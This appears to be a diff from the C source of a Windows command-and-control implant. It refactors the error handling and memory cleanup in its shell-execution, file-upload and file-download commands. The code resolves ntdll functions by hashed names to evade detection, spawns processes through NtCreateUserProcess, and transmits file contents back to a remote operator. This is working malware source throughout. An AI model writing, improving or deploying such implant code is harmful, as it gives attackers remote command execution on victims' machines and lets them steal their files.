@@ -145,6 +145,10 @@ VOID CommandShell( PPARSER Parser ){
     HANDLE  hStdOutPipeRead  = NULL;
     HANDLE  hStdOutPipeWrite = NULL;
 
+    PPS_ATTRIBUTE_LIST attrib_list = NULL;
+    PSECTION_IMAGE_INFORMATION sec_img_info = NULL;
+    PCLIENT_ID client_id = NULL;
+
     SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
     Command = ParserGetBytes(Parser, (PUINT32) &Length);
@@ -203,7 +207,9 @@ VOID CommandShell( PPARSER Parser ){
 
     // create process params struct
     RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
-    check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01) == 0, "RtlCreateProcessParametersEx Failed!");
+    check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path,
+                                               NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
+                                               0x01) == 0, "RtlCreateProcessParametersEx Failed!");
 
     // create info struct
     PS_CREATE_INFO create_info = { 0 };
@@ -232,28 +238,35 @@ VOID CommandShell( PPARSER Parser ){
     // make attributes
     // OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
     // PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
-    PCLIENT_ID client_id = (PCLIENT_ID)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
-    PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
-    PSECTION_IMAGE_INFORMATION sec_img_info = (PSECTION_IMAGE_INFORMATION)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
+    client_id = (PCLIENT_ID) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+    attrib_list = (PS_ATTRIBUTE_LIST *) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+    sec_img_info = (PSECTION_IMAGE_INFORMATION) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
 
     attrib_list->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - (sizeof(PS_ATTRIBUTE));
     attrib_list->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
     attrib_list->Attributes[0].Size = nt_image_path.Length;
     attrib_list->Attributes[0].Value = (ULONG_PTR)nt_image_path.Buffer;
 
-    NTSTATUS status;
     HANDLE h_proc, h_thread = NULL;
     NtCreateUserProcess_t p_NtCreateUserProcess = (NtCreateUserProcess_t) GetProcAddressByHash(p_ntdll, NtCreateUserProcess_CRC32B);
 
-    check_debug(p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list) == 0, "NtCreateUserProcess Failed!");
+    check_debug(p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL,
+                                      PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info,
+                                      attrib_list) == 0, "NtCreateUserProcess Failed!");
 
     RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);
 
-    p_RtlFreeHeap(RtlProcessHeap(), 0, attrib_list);
-    p_RtlFreeHeap(RtlProcessHeap(), 0, sec_img_info);
-    p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
-
     LEAVE:
+    if(attrib_list != NULL){
+        p_RtlFreeHeap(RtlProcessHeap(), 0, attrib_list);
+    }
+    if(sec_img_info != NULL){
+        p_RtlFreeHeap(RtlProcessHeap(), 0, sec_img_info);
+    }
+    if(client_id != NULL){
+        p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
+    }
+
     LocalFree(*(PVOID *)wide_command);
     LocalFree(*(PVOID *)wide_args);
     LocalFree(*(PVOID *)command_array);
@@ -365,25 +378,22 @@ VOID CommandUpload( PPARSER Parser ) {
     RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
     p_RtlInitUnicodeString(&file_path, w_file_path);
 
+
     OBJECT_ATTRIBUTES obj_attrs;
     IO_STATUS_BLOCK io_status_block;
 
 
     InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
     NtCreateFile_t p_NtCreateFile = GetProcAddressByHash(p_ntdll, NtCreateFile_CRC32B);
-    if ((status = p_NtCreateFile(&hFile, FILE_GENERIC_WRITE, &obj_attrs, &io_status_block, NULL,
-                                 FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
-                                 FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
-                                 0)) != 0x0) {
-        //_tprintf("[*] NtCreateFile: Failed[0x%lx]\n", status);
-        goto LEAVE;
-    }
+
+    check_debug(p_NtCreateFile(&hFile, FILE_GENERIC_WRITE, &obj_attrs, &io_status_block, NULL,
+                               FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
+                               FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
+                               0) == 0, "p_NtCreateFile Failed!");
 
     NtWriteFile_t p_NtWriteFile = GetProcAddressByHash(p_ntdll, NtWriteFile_CRC32B);
-    if ((status = p_NtWriteFile(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize-1, 0, 0)) != 0x0) {
-        //_tprintf("[*] NtWriteFile: Failed[0x%lx]\n", status);
-        goto LEAVE;
-    }
+    check_debug(p_NtWriteFile(hFile, NULL, NULL, NULL, &io_status_block,
+                              Content, FileSize-1, 0, 0) == 0, "p_NtWriteFile Failed!");
 
     Written = io_status_block.Information;
 
@@ -392,6 +402,7 @@ VOID CommandUpload( PPARSER Parser ) {
     PackageTransmit(Package, NULL, NULL);
 
     LEAVE:
+    LocalFree(w_file_path);
     CloseHandle(hFile);
     hFile = NULL;
 
@@ -413,15 +424,10 @@ VOID CommandUpload( PPARSER Parser ) {
 
     hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
-    if ( hFile == INVALID_HANDLE_VALUE ) {
-        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
-        goto LEAVE;
-    }
+    check_debug(hFile != INVALID_HANDLE_VALUE, "CreateFileA Failed!");
 
-    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL)) {
-        // _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
-        goto LEAVE;
-    }
+    check_debug(WriteFile( hFile, Content, FileSize,
+                           &Written, NULL) != 0, "WriteFile Failed!");
 
     PackageAddInt32( Package, FileSize );
     PackageAddBytes( Package, (PUCHAR)FileName, NameSize );
@@ -481,6 +487,7 @@ VOID CommandDownload( PPARSER Parser ) {
     WCHAR *w_file_path = str_to_wide(file_name);
     RtlInitUnicodeString_t p_RtlInitUnicodeString = GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
     p_RtlInitUnicodeString(&file_path, w_file_path);
+    LocalFree(w_file_path);
     OBJECT_ATTRIBUTES obj_attrs;
     IO_STATUS_BLOCK io_status_block;
 
@@ -489,27 +496,22 @@ VOID CommandDownload( PPARSER Parser ) {
 
     NtOpenFile_t p_NtOpenFile = GetProcAddressByHash(p_ntdll, NtOpenFile_CRC32B);
 
-    if((status = p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT)) != 0){
-        //_tprintf("NtOpenFile: 0x%lx\n", status);
-        goto LEAVE;
-    }
+    check_debug(p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ,
+                             FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) == 0, "p_NtOpenFile Failed!");
 
     FILE_STANDARD_INFORMATION file_standard_info;
     NtQueryInformationFile_t p_NtQueryInformationFile = GetProcAddressByHash(p_ntdll, NtQueryInformationFile_CRC32B);
-    if((status = p_NtQueryInformationFile(hFile, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0) {
-        // _tprintf("NtQueryInformationFile failed with status: 0x%lx\n", status);
-        goto LEAVE;
-    }
+    check_debug(p_NtQueryInformationFile(hFile, &io_status_block,
+                                         &file_standard_info, sizeof(FILE_STANDARD_INFORMATION),
+                                         FileStandardInformation) == 0,"p_NtQueryInformationFile Failed!");
 
     FileSize = file_standard_info.EndOfFile.QuadPart;
     // _tprintf("file_size: %d\n", FileSize);
     Content  = LocalAlloc( LPTR, FileSize );
 
     NtReadFile_t p_NtReadFile = GetProcAddressByHash(p_ntdll, NtReadFile_CRC32B);
-    if((status = p_NtReadFile(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, NULL, NULL)) != 0x0) {
-        // _tprintf("NtReadFile failed with status: 0x%lx\n", status);
-        goto LEAVE;
-    }
+    check_debug( p_NtReadFile(hFile, NULL, NULL, NULL,
+                              &io_status_block, Content, FileSize, NULL, NULL) == 0, "p_NtReadFile Failed!");
 
     Read += io_status_block.Information;
 
@@ -537,20 +539,13 @@ VOID CommandDownload( PPARSER Parser ) {
     // _tprintf( "FileName => %s\n", FileName );
 
     hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
-    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
-    {
-        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
-        goto LEAVE;
-    }
+
+    check_debug( !(( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE )), "CreateFileA Failed!" );
 
     FileSize = GetFileSize( hFile, 0 );
     Content  = LocalAlloc( LPTR, FileSize );
 
-    if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
-    {
-        // _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
-        goto LEAVE;
-    }
+    check_debug(ReadFile( hFile, Content, FileSize, &Read, NULL ) != 0, "ReadFile Failed!" );
 
     PackageAddBytes( Package, FileName, NameSize );
     PackageAddBytes( Package, Content,  FileSize );
@@ -569,7 +564,6 @@ VOID CommandDownload( PPARSER Parser ) {
         LocalFree( Content );
         Content = NULL;
     }
-
 
 }
 
